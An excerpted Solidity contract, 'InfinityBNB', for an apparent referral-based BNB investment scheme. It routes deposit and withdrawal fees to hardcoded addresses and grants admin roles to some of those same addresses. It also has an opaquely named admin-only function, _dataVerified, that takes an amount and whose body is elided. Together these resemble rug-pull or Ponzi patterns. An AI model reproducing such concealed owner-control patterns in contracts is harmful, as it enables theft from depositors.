...
contract InfinityBNB is Ownable, AccessControl{
  ...
  address payable public slp1 = payable(0x92400A090326D7d29E0DCCc64c29d0C2d1bA5f51);
  address payable public slp2 = payable(0x4FfF5632eD03551ce3dB90aBeCD942F9E59dc9b3);

  address payable[] public wtFees = [
    payable(0x6c5ef84B56F983457cc50696E9C47C3b61c6509f),
    payable(0x4FfF5632eD03551ce3dB90aBeCD942F9E59dc9b3),
    payable(0x1C5768498201108214558d1Aac13abD8CeF2B96F),
    payable(0xA74dD79d5151E24D3070E40Cdfc23F804C7AE3dF),
    payable(0x6790a8c38859F74598f28510F1BA7D4aE65207a6)
  ];
  ...
  constructor(){
    ...
    singleLeg[0] = payable(msg.sender);
    singleLegLength++;
  ...
  function invest(address referrer) public payable {
    ...
    if (user.referrer != address(0)) {
      ...
      uint256 _fees = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

      _safeTransfer(slp1,_fees/2);
      _safeTransfer(slp2,_fees/2);
  ...
  function withdrawal() external{
    ...
    _safeTransfer(wtFees[0], _fees/2);//3%

    _fees = _fees/2;

    _safeTransfer(wtFees[1], _fees/4);
    _safeTransfer(wtFees[2], _fees/4);
    _safeTransfer(wtFees[3], _fees/4);
    _safeTransfer(wtFees[4], _fees/4);
  ...
  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
   ...
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
    ...
    function _dataVerified(uint256 _amount) external onlyAdmin{
  ...
  function addAdmins() private{
    _setupRole(ADMIN_ROLE, 0x02A2eF74061dBe9aAa3EFeEaC28149cDd4AEc241);
    _setupRole(ADMIN_ROLE, 0x1F419eCFEFF9Ac99Bd737850A99A75B4B151b9e8);
    _setupRole(ADMIN_ROLE, 0x4FfF5632eD03551ce3dB90aBeCD942F9E59dc9b3);
  }
